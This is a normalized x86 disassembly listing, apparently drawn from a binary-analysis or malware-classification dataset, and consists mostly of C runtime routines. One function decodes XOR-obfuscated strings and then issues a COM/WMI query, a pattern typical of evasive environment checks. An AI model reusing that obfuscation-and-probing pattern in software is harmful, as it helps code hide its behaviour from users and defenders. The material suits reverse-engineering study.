xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_411115
pop ecx
call sub_40f84f
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_40f84f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40b0dc
pop ecx
mov [ esi ] eax
push esi
call sub_411115
pop ecx
test eax eax
je r-xdata
call sub_40f84f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40b0dc
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_40438b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_402116
pop ecx
push eax
call sub_4026f7
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_404430
push esi
mov esi [ edi ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0x0
test esi esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call sub_408b16
add esp 0x4
push eax
call sub_408b16
add esp 0x4
sub_404477
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_407759
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_40dda0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_40f84f
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40458d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_40140f
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_4037cf
int3
sub_4045bd
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4021d8
add esp 0x18
pop ebp
retn
sub_404610
push ebp
mov ebp esp
push 0xffffffff
push sub_416549
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xd8 ] eax
xor eax eax
cmp [ edx + 0x8 ] 0x6
mov [ ebp - 0xe4 ] ecx
jne r-xdata
mov ecx [ r--data ]
mov ecx [ r--data ]
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x51
and edx 0xff
mov [ ebp + eax * 2 - 0x40 ] dx
inc eax
cmp eax 0x13
jb r-xdata
xor eax eax
mov [ ebp - 0x1a ] ax
lea edx [ eax + 0x32 ]
lea eax [ ebp - 0xc4 ]
lea edi [ ebp - 0x40 ]
mov ecx eax
sub edi ecx
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa1
and edx 0xff
mov [ ebp + eax * 2 - 0x40 ] dx
inc eax
cmp eax 0x14
jb r-xdata
lea ecx [ edx + 0x7fffffcc ]
test ecx ecx
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] ax
lea edx [ eax + 0x32 ]
lea eax [ ebp - 0xc4 ]
lea edi [ ebp - 0x40 ]
mov ecx eax
sub edi ecx
test edx edx
jne r-xdata
movzx ecx [ eax + edi ]
test cx cx
je r-xdata
movzx ecx [ eax + edi ]
test cx cx
je r-xdata
xor edx edx
push edx
push edx
mov [ eax ] dx
call [ CoInitializeEx@IAT ]
test eax eax
je r-xdata
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xc8 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
jmp r-xdata
lea ecx [ edx + 0x7fffffcc ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0xd4 ]
push ecx
lea edi [ ebp - 0xc4 ]
call sub_401ed0
mov [ ebp - 0x4 ] 0x0
mov eax [ eax ]
test eax eax
je r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov edi eax
add eax 0x8
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc8 ]
mov edx [ eax ]
lea esi [ ebp - 0xcc ]
push esi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push eax
mov eax [ edx + 0xc ]
call eax
or esi 0xffffffff
mov ebx eax
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0xd4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xcc ]
push 0x0
push 0x0
push 0x3
push 0x3
push 0x0
push 0x0
push 0xa
push eax
call [ CoSetProxyBlanket@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x4
jmp r-xdata
test edi edi
je r-xdata
lea edi [ ebp - 0xe0 ]
mov eax 0x20
call sub_402a90
mov edi [ ebp - 0xd8 ]
lea eax [ ebp - 0xd4 ]
push eax
call sub_401ed0
mov edi eax
lea ecx [ ebp - 0xe0 ]
push ecx
lea ebx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x1
call sub_403290
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x5
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor ecx ecx
mov ecx [ ecx ]
jmp r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
xor edx edx
mov edx [ eax ]
jmp r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
push edi
call sub_408b16
add esp 0x4
push eax
call sub_408b16
add esp 0x4
lea edx [ ebp - 0x58 ]
mov eax 0x1e
call sub_404a80
mov eax [ ebp - 0xd0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x6
jmp r-xdata
mov eax [ ebp - 0xcc ]
mov edi [ eax ]
lea ebx [ ebp - 0xd0 ]
push ebx
push 0x0
push 0x30
push ecx
push edx
mov edx [ edi + 0x50 ]
push eax
call edx
lea edi [ ebp - 0xd8 ]
mov ebx eax
call sub_404430
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] esi
call sub_404430
test ebx ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
xor eax eax
mov esi 0x7
test eax eax
je r-xdata
mov eax [ ebp - 0xdc ]
mov ecx [ eax ]
push 0x0
push 0x0
lea edx [ ebp - 0xfc ]
push edx
push 0x0
lea edx [ ebp - 0x58 ]
push edx
push eax
mov eax [ ecx + 0x10 ]
call eax
mov eax [ ebp - 0xf4 ]
xor ecx ecx
mov [ ebp - 0x34 ] cx
mov ecx eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] 0x0
lea edi [ ecx + 0x2 ]
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
lea ecx [ ebp - 0x34 ]
call sub_4067a0
mov ebx [ ebp - 0xe4 ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x3
call sub_413010
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x20 ] 0x8
jb r-xdata
lea ecx [ ebp - 0xfc ]
xor eax eax
push ecx
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] ax
call [ VariantClear@IAT ]
mov eax [ ebp - 0xdc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0xd0 ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x34 ]
push edx
call sub_408b16
add esp 0x4
mov ecx [ eax ]
lea edx [ ebp - 0xe8 ]
push edx
lea edx [ ebp - 0xdc ]
push edx
push 0x1
push 0xffffffff
push eax
mov eax [ ecx + 0x10 ]
call eax
cmp [ ebp - 0xe8 ] 0x0
mov eax [ ebp - 0xd0 ]
je r-xdata
sub_404a80
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_404ad7
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_403231
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_404b10
push ebp
mov ebp esp
shr eax 0x1
mov ecx 0x0
je r-xdata
mov ecx 0x80070057
cmp eax 0x7fffffff
jbe r-xdata
xor ecx ecx
push esi
xor esi esi
mov edx eax
mov ecx edi
test eax eax
je r-xdata
mov edx ecx
test ecx ecx
js r-xdata
mov eax edx
pop ebp
retn 0x4
sub eax ecx
lea ecx [ edi + ecx * 2 ]
mov edx 0x7fffffff
pop ebp
jmp sub_413550
mov esi 0x80070057
mov edx esi
xor ecx ecx
pop esi
jmp r-xdata
lea esp [ esp ]
test edx edx
js r-xdata
test edx edx
jne r-xdata
add ecx 0x2
dec edx
jne r-xdata
mov ecx eax
sub ecx edx
mov edx esi
pop esi
jmp r-xdata
cmp [ ecx ] si
je r-xdata
mov esi 0x80070057
mov edx esi
xor ecx ecx
pop esi
jmp r-xdata
sub_404b90
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov [ esi ] r--data
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push eax
call sub_408b16
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_408b16
add esp 0x4
sub_404bc8
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_401802
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40a4e5
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_40ab76
pop ecx
xor esi esi
push 0x0
push esi
call sub_40afb0
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_404c41
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_40a2d1
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_40ddd8
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_40ca53
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_402acd
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_401400
leave
retn
sub_404ccf
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp esi ebx
je r-xdata
call sub_40f84f
push 0x16
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov [ esi ] bl
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x18 ]
cmp eax edi
jbe r-xdata
mov [ eax ] ebx
cmp eax 0x7fffffff
ja r-xdata
mov eax edi
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_404d94
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
inc eax
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
cmp eax edi
jbe r-xdata
call sub_40f84f
mov eax [ eax ]
jmp r-xdata
mov [ esi ] bl
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax + esi - 0x1 ] bl
cmp [ ebp + 0x18 ] 0xffffffff
je r-xdata
mov eax edi
mov [ ebp - 0x4 ] 0x50
mov [ esi ] bl
cmp edi eax
ja r-xdata
call sub_40f84f
push 0x22
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_40c515
mov eax esi
jmp r-xdata
sub_404d94
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
cmp esi ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x20 ]
call sub_407759
cmp edi ebx
je r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov edi [ ebp - 0x20 ]
cmp [ edi + 0x14 ] ebx
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
push ebx
push ebx
push 0xffffffff
push esi
push ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
jne r-xdata
movzx ecx [ esi ]
xor eax eax
mov edx esi
jmp r-xdata
cmp [ edi + 0xac ] 0x1
jne r-xdata
mov eax ebx
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
call sub_40f84f
mov [ eax ] 0x2a
cmp [ ebp - 0x14 ] bl
je r-xdata
cmp cx bx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ ebp + 0x10 ]
push [ ebp - 0x28 ]
push 0xffffffff
push esi
push ebx
push [ edi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
mov ecx 0xff
cmp [ esi ] cx
ja r-xdata
dec eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov esi 0xff
cmp cx si
ja r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ ebp + 0x10 ]
push [ ebp - 0x28 ]
push [ ebp + 0x10 ]
push esi
push ebx
push [ edi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov cl [ esi ]
mov edx [ ebp - 0x28 ]
mov [ edx + eax ] cl
mov cx [ esi ]
add esi 0x2
test cx cx
je r-xdata
inc eax
add edx 0x2
movzx ecx [ edx ]
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp - 0x10 ] ebx
jne r-xdata
cmp ecx ebx
je r-xdata
add eax 0x2
dec ecx
jne r-xdata
inc eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
mov ecx [ ebp - 0x28 ]
cmp [ ecx + eax - 0x1 ] bl
jne r-xdata
cmp [ eax ] bx
jne r-xdata
cmp [ eax ] bx
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
push [ edi + 0xac ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
push esi
push ebx
push [ edi + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov edx eax
mov [ ebp - 0x30 ] edx
cmp edx ebx
je r-xdata
jmp r-xdata
sub eax esi
sar eax 0x1
inc eax
mov [ ebp + 0x10 ] eax
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x10 ] ebx
jne r-xdata
cmp edx ebx
jl r-xdata
cmp edx 0x5
ja r-xdata
mov eax [ ebp - 0x24 ]
lea ecx [ edx + eax ]
cmp ecx [ ebp + 0x10 ]
ja r-xdata
xor ecx ecx
mov [ ebp - 0x2c ] ecx
cmp edx ebx
jle r-xdata
add esi 0x2
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov cl [ ebp + ecx - 0xc ]
mov edx [ ebp - 0x28 ]
mov [ edx + eax ] cl
cmp cl bl
je r-xdata
mov ecx [ ebp - 0x2c ]
inc ecx
inc eax
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x24 ] eax
cmp ecx [ ebp - 0x30 ]
jl r-xdata
sub_404ffb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_41064f
call sub_41064f
mov [ esi ] eax
jmp r-xdata
call sub_40f84f
push 0x16
pop esi
mov [ eax ] esi
call sub_40c515
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_41064f
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_40505a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4021d8
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d564
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40abdf
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4041f1
jmp r-xdata
sub_4050e2
mov edi edi
push esi
call [ GetEnvironmentStringsW@IAT ]
mov esi eax
xor ecx ecx
cmp esi ecx
jne r-xdata
cmp [ esi ] cx
je r-xdata
xor eax eax
pop esi
retn
push ebx
sub eax esi
lea ebx [ eax + 0x2 ]
push edi
push ebx
call sub_402a4b
mov edi eax
pop ecx
test edi edi
jne r-xdata
add eax 0x2
cmp [ eax ] cx
jne r-xdata
push ebx
push esi
push edi
call sub_415340
add esp 0xc
jmp r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax edi
pop edi
pop ebx
pop esi
retn
add eax 0x2
cmp [ eax ] cx
jne r-xdata
sub_40513a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_41450f
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_41431b
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_413e10
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_4142ec
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_41437f
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_413e10
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_4142ec
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_405330
push ebp
mov ebp esp
push 0xffffffff
push sub_416168
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ edi + 0x24 ]
cmp eax esi
je r-xdata
lea ebx [ edi + 0x14 ]
mov [ edi + 0x24 ] esi
mov [ edi + 0x28 ] esi
mov [ edi + 0x2c ] esi
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x14 ]
mov eax ebx
call sub_40ff10
mov ebx [ ebx + 0x4 ]
push ebx
call sub_408b16
lea esi [ edi + 0x4 ]
add esp 0x4
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea edi [ ebp - 0x14 ]
call sub_411a50
mov eax [ esi + 0x4 ]
push eax
call sub_408b16
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_408b16
